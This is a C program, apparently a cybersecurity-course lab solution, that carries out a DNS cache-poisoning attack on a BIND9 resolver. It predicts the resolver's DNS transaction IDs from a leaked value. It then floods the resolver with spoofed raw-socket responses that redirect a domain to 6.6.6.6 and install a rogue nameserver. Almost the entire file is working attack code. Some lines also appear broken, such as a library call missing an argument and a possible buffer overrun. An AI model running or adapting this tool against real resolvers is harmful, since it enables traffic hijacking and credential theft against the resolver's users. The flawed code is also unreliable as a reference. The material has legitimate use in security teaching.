#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>

#define QUERY_DOMAIN "www.attacker.cybercourse.com"
#define TARGET_DOMAIN "www.example.cybercourse.com"
#define NS_DOMAIN "ns.cybercourse.com."
#define TAP1 0x80000057
#define TAP2 0x80000062

#define BIND9_PORT 53
#define ATTACKER_PORT 1024
#define BUFFER_SIZE 512
#define SLEEP_INTERVAL 100000
#define BIND9_IP "192.168.1.203"
#define SPOOFED_IP "192.168.1.204"
#define SPOOFED_RESPONSE_IP "6.6.6.6"

// Function to predict the next 10 TXIDs
void predict_txids(uint16_t txid, uint16_t *candidates) {
    // Ensure the TXID has an even LSB
    if (txid & 1) {
        fprintf(stderr, "LSB of TXID is not 0. Cannot predict the next TXIDs.\n");
        exit(EXIT_FAILURE);
    }
    int idx = 0;
    // Predict TXIDs for one bit shift (LSBs 0 and 0)
    for (int msb = 0; msb < (1 << 1); msb++) {
        candidates[idx++] = ((msb << 15) | (txid >> 1)) & 0xFFFF;
    }
    // Predict TXIDs for two bit shift (LSBs 1 and 1)
    uint32_t v = txid;
    v = (v >> 1) ^ TAP1 ^ TAP2;

    uint32_t v1, v2;
    if ((v & 1) == 0) {
        // LSB becomes 0 (identical LSBs)
        v1 = (v >> 1);            // Case: 0 and 0
        v2 = (v >> 1) ^ TAP1 ^ TAP2; // Case: 1 and 1
    } else {
        // LSB becomes 1 (different LSBs)
        v1 = (v >> 1) ^ TAP1;     // Case: 1 and 0
        v2 = (v >> 1) ^ TAP2;     // Case: 0 and 1
    }
    // Enumerate MSBs for the derived values
    for (int msbits = 0; msbits < (1 << 2); msbits++) {
        candidates[idx++] = ((msbits << 14) | v1) & 0xFFFF;
        candidates[idx++] = ((msbits << 14) | v2) & 0xFFFF;
    }
}

// Function to calculate IP checksum
unsigned short calculate_ip_checksum(unsigned short *buf, int nwords) {
    unsigned long sum; // 32-bit sum to handle overflow
    // Sum all 16-bit words in the buffer
    for (sum = 0; nwords > 0; nwords--) {
        sum += *buf++;
    }
    // Fold upper 16 bits into lower 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);  // Add carry-over (if any)
    // Return one's complement of sum
    return (unsigned short)(~sum);
}


// Function to calculate UDP checksum
unsigned short calculate_udp_checksum(struct iphdr *iph, struct udphdr *udph, uint8_t *payload, int payload_len) {
    unsigned long sum = 0;  // 32-bit sum to accumulate the checksum

    // Define the pseudo-header structure
    struct pseudo_header {
        uint32_t src_addr;     // Source IP address
        uint32_t dst_addr;     // Destination IP address
        uint8_t zero;          // Placeholder (always 0)
        uint8_t protocol;      // Protocol (UDP)
        uint16_t udp_length;   // Length of UDP header + payload
    } pseudo_hdr;

    // Fill the pseudo-header with values from the IP header and UDP header
    pseudo_hdr.src_addr = iph->saddr;
    pseudo_hdr.dst_addr = iph->daddr;
    pseudo_hdr.zero = 0;
    pseudo_hdr.protocol = IPPROTO_UDP;
    pseudo_hdr.udp_length = htons(sizeof(struct udphdr) + payload_len);

    // Calculate checksum over pseudo-header
    uint16_t *pseudo_hdr_ptr = (uint16_t *)&pseudo_hdr;
    for (long unsigned int i = 0; i < sizeof(pseudo_hdr) / 2; i++) {
        sum += *pseudo_hdr_ptr++;
    }
    // Calculate checksum over UDP header
    uint16_t *udp_hdr_ptr = (uint16_t *)udph;
    for (long unsigned int i = 0; i < sizeof(struct udphdr) / 2; i++) {
        sum += *udp_hdr_ptr++;
    }
    // Calculate checksum over UDP payload
    uint16_t *payload_ptr = (uint16_t *)payload;
    for (int i = 0; i < payload_len / 2; i++) {
        sum += *payload_ptr++;
    }
    // Handle case where payload length is odd (add remaining byte)
    if (payload_len % 2) {
        sum += *(uint8_t *)payload_ptr;
    }
    // Fold upper 16 bits into lower 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);  // Add carry-over (if any)
    // Return one's complement of sum
    return (unsigned short)(~sum);
}


void add_opt_section(ldns_rr **opt_rr) {
    *opt_rr = ldns_rr_new();
    ldns_rr_set_type(*opt_rr, LDNS_RR_TYPE_OPT);  // OPT pseudo-RR type
    ldns_rr_set_class(*opt_rr, 4096);             // UDP payload size (4096 bytes)
    ldns_rr_set_ttl(*opt_rr, 0x8000);             // Flags: DO=1 (DNSSEC OK)
    ldns_rr_set_owner(*opt_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "."));  // Root name (".")
}

ldns_pkt *create_spoofed_response(const char *target_domain, const char *spoofed_ip, uint16_t txid) {
    ldns_pkt *response = ldns_pkt_new();
    ldns_rr *answer_rr, *authority_rr, *additional_rr, *opt_rr;
    ldns_rdf *owner, *address, *ns_name;

    // Set up the DNS packet header
    ldns_pkt_set_id(response, txid);           // Transaction ID
    ldns_pkt_set_qr(response, true);           // Set QR = 1 (indicating response)
    ldns_pkt_set_aa(response, true);           // Set AA = 1 (authoritative answer)
    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);  // Response code (No error)

    // Create and add the question section (query for www.example.cybercourse.com)
    ldns_rr *question_rr = ldns_rr_new_frm_type(LDNS_RR_TYPE_A);
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, TARGET_DOMAIN);
    ldns_rr_set_owner(question_rr, owner);
    ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);
    ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question_rr);

    // Create and add the answer section (A record for target_domain -> spoofed_ip)
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, target_domain);
    address = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, spoofed_ip);
    answer_rr = ldns_rr_new();
    ldns_rr_set_owner(answer_rr, owner);
    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(answer_rr, 300);           // TTL of 300 seconds
    ldns_rr_push_rdf(answer_rr, address);
    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);

    // Create and add the authority section (NS record for cybercourse.com -> ns.cybercourse.com)
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "cybercourse.com.");
    ns_name = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, NS_DOMAIN);
    authority_rr = ldns_rr_new();
    ldns_rr_set_owner(authority_rr, owner);
    ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
    ldns_rr_set_class(authority_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(authority_rr, 600);        // TTL of 600 seconds
    ldns_rr_push_rdf(authority_rr, ns_name);
    ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);

    // Create and add the additional section (A record for ns.cybercourse.com -> 192.168.1.204)
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, NS_DOMAIN);
    address = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, SPOOFED_IP);
    additional_rr = ldns_rr_new();
    ldns_rr_set_owner(additional_rr, owner);
    ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
    ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN);
    ldns_rr_set_ttl(additional_rr, 600);       // TTL of 600 seconds
    ldns_rr_push_rdf(additional_rr, address);
    ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, additional_rr);

    // Create and add the OPT record (additional section for EDNS0)
    add_opt_section(&opt_rr);

    // Push the OPT record to the additional section
    ldns_pkt_push_rr(response , opt_rr);

    // Return the fully constructed spoofed DNS response
    return response;
}


// Build and send a raw DNS packet
void send_raw_dns_packet(uint16_t txid, uint16_t source_port) {
    char packet[BUFFER_SIZE];                    // Buffer to store raw packet
    uint8_t *dns_payload;                        // Pointer for DNS payload
    size_t dns_payload_size;                     // Size of DNS payload

    // Create a spoofed DNS response packet
    ldns_pkt *dns_response = create_spoofed_response(TARGET_DOMAIN, SPOOFED_RESPONSE_IP, txid);
    ldns_pkt2wire(&dns_payload, dns_response, &dns_payload_size);

    // Prepare IP and UDP headers
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));

    // Fill IP header fields
    iph->ihl = 5;                                // IP header length (5 x 4 bytes = 20 bytes)
    iph->version = 4;                            // IPv4
    iph->tos = 0;                                // Type of Service (default 0)
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_size);  // Total packet length
    iph->id = htonl(54321);                      // Packet ID (for fragmentation)
    iph->frag_off = 0;                           // Fragment offset (no fragmentation)
    iph->ttl = 64;                               // Time to live (TTL)
    iph->protocol = IPPROTO_UDP;                 // Protocol (UDP)
    iph->saddr = inet_addr(SPOOFED_IP);          // Spoofed source IP address
    iph->daddr = inet_addr(BIND9_IP);           // Destination IP address
    iph->check = calculate_ip_checksum((unsigned short *)iph, sizeof(struct iphdr));  // Calculate IP checksum

    // Fill UDP header fields
    udph->source = htons(BIND9_PORT);              // Source port (DNS default port 53)
    udph->dest = htons(source_port);             // Destination port
    udph->len = htons(sizeof(struct udphdr) + dns_payload_size);  // UDP length
    udph->check = 0;                             // Initially set UDP checksum to 0
    udph->check = calculate_udp_checksum(iph, udph, dns_payload, dns_payload_size);  // Calculate UDP checksum

    // Copy DNS payload to the packet buffer (after IP and UDP headers)
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_payload, dns_payload_size);

    // Create a raw socket for packet transmission
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Raw socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Define destination address for the packet
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(BIND9_IP);

    // Send the raw packet using the socket
    if (sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_size, 0,
               (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("Packet send failed");
    }

    // Close the socket and free allocated resources
    close(sockfd);
    free(dns_payload);
    ldns_pkt_free(dns_response);
}


int main() {
    int send_sockfd, recv_sockfd;
    struct sockaddr_in recv_addr, bind9_addr;
    char buffer[BUFFER_SIZE];
    uint16_t txid, source_port, candidates[10];

    // Create a UDP socket for sending DNS queries
    if ((send_sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Send socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Set up BIND9 server address for sending queries
    memset(&bind9_addr, 0, sizeof(bind9_addr));
    bind9_addr.sin_family = AF_INET;
    bind9_addr.sin_port = htons(BIND9_PORT);
    inet_pton(AF_INET, BIND9_IP, &bind9_addr.sin_addr);

    // Create and send a DNS query to BIND9
    ldns_pkt *query = ldns_pkt_query_new(
        ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, QUERY_DOMAIN),
        LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD
    );
    uint8_t *query_data;
    size_t query_size;
    ldns_pkt2wire(&query_data, query, &query_size);
    sendto(send_sockfd, query_data, query_size, 0, (struct sockaddr *)&bind9_addr, sizeof(bind9_addr));

    // Free allocated resources for the query packet
    ldns_pkt_free(query);
    free(query_data);

    // Create a UDP socket for receiving DNS data
    if ((recv_sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Receive socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Bind the receiving socket to ATTACKER_PORT
    memset(&recv_addr, 0, sizeof(recv_addr));
    recv_addr.sin_family = AF_INET;
    recv_addr.sin_port = htons(ATTACKER_PORT);
    recv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(recv_sockfd, (struct sockaddr *)&recv_addr, sizeof(recv_addr)) < 0) {
        perror("Bind failed for receive socket");
        exit(EXIT_FAILURE);
    }

    // Wait for incoming data from the attacker server
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    int bytes_received = recvfrom(recv_sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&client_addr, &addr_len);
    if (bytes_received < 0) {
        perror("Receive failed");
        exit(EXIT_FAILURE);
    }

    buffer[bytes_received] = '\0'; // Null-terminate received data

    // Parse the received data to extract TXID and source port
    if (sscanf(buffer, "%hu:%hu", &txid, &source_port) != 2) {
        perror("Failed to parse received data");
        close(recv_sockfd);
        close(send_sockfd);
        exit(EXIT_FAILURE);
    }

    // Predict next possible TXIDs using the received TXID
    predict_txids(txid, candidates);
    usleep(SLEEP_INTERVAL); // Sleep for 0.1 seconds to avoid flooding
    // Send spoofed DNS responses to BIND9 for each predicted TXID
    for (int i = 0; i < 10; i++) {
        send_raw_dns_packet(candidates[i], source_port);
    }
    // Close the sockets after completing the attack
    close(send_sockfd);
    close(recv_sockfd);

    return 0;
}